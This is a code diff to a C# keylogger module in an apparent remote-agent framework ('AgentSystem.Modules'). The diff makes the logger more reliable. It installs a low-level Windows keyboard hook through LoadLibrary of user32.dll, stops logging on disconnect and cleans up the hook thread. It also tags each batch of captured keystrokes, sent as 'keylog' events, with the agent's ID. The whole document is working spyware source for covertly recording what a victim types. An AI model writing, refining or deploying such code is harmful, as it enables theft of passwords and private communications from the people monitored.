@@ -53,6 +53,9 @@ namespace AgentSystem.Modules
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
 
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr LoadLibrary(string lpFileName);
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
         private static extern short GetAsyncKeyState(int keyCode);
 
@@ -76,6 +79,12 @@ namespace AgentSystem.Modules
             }
         }
 
+        public override void OnDisconnected()
+        {
+            StopLogging("auto_disconnect");
+            base.OnDisconnected();
+        }
+
         private Task StartLoggingAsync(string commandId)
         {
             lock (_stateLock)
@@ -95,6 +104,7 @@ namespace AgentSystem.Modules
                 // Hook bắt buộc chạy trên Thread có Message Loop
                 hookThread = new Thread(() =>
                 {
+                    hookThreadId = GetCurrentThreadId();
                     hookId = SetHook(hookProc);
                     Application.Run(); 
                 });
@@ -134,6 +144,7 @@ namespace AgentSystem.Modules
                     hookThreadId = 0;
                 }
 
+                hookThread?.Join(500);
                 hookThread = null; 
                 isLogging = false;
                 FlushBuffer(); // Đẩy dữ liệu còn sót
@@ -160,12 +171,8 @@ namespace AgentSystem.Modules
 
         private IntPtr SetHook(LowLevelKeyboardProc proc)
         {
-            using (Process curProcess = Process.GetCurrentProcess())
-            {
-                var mainModule = curProcess.MainModule;
-                if (mainModule == null) return IntPtr.Zero;
-                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(mainModule.ModuleName), 0);
-            }
+            IntPtr handle = LoadLibrary("user32.dll");
+            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, handle, 0);
         }
 
         private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
@@ -208,7 +215,8 @@ namespace AgentSystem.Modules
             {
                 type = "keylog",
                 command_id = activeCommandId,
-                events = batchToSend
+                events = batchToSend,
+                agent_id = context.AgentId
             });
         }
     }
